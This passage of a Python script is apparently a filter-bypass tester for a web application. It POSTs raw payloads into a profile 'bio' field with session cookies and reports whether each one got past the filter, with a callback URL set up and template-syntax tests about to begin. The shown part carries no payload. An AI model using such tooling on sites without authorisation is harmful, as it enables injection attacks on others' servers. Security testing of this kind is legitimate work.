print(f"Target: {base_url}")
print(f"Callback: {callback_url}")
print("=" * 70)

def test_payload(payload_name, raw_payload, description=""):
    print(f"\n{'-' * 70}")
    print(f"Test: {payload_name}")
    if description:
        print(f"Description: {description}")
    
    profile_url = base_url + "/profile"
    data = {"bio": raw_payload}
    
    try:
        response = requests.post(profile_url, data=data, cookies=cookies, allow_redirects=False)
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}B")
        
        if response.status_code == 200:
            print("✓ SUCCESS: Payload bypassed filter!")
        elif response.status_code == 400:
            print("✗ BLOCKED: 400 Bad Request")
        elif response.status_code == 500:
            print("! SERVER ERROR: 500 (may indicate partial execution)")
        
        if response.text and len(response.text) < 300 and "Bad Request" not in response.text:
            print(f"Response: {response.text}")
        
        return response.status_code
    except Exception as e:
        print(f"Request error: {e}")
        return None

print("\nPHASE 1: CONTROL TESTS")
print("=" * 70)

# Test normal text first
control = "Normal bio without special characters"
result_ctrl = test_payload("Normal text", control, "Control - should succeed")

# Test simple template syntax
